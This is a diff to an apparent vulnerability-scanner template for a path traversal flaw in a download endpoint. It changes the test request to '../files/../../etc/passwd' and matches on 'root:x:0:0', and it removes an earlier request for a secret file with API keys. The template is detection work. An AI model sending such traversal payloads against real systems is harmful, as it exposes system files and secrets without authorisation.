@@ -4,15 +4,15 @@ info:
   name: Sensitive file disclosure via insecure path validation
   author: vignesh
   severity: high
-  description: Application allows reading files outside the intended directory due to flawed prefix-based path validation
+  description: Improper prefix-based path validation allows directory traversal and exposure of sensitive system files.
 
 requests:
   - method: GET
     path:
-      - "http://172.31.138.39:8002/download?file=../files/../files_evil/secret.txt"
+      - "/download?file=../files/../../etc/passwd"
 
     matchers:
       - type: word
         part: body
         words:
-          - "API_KEY="
+          - "root:x:0:0"
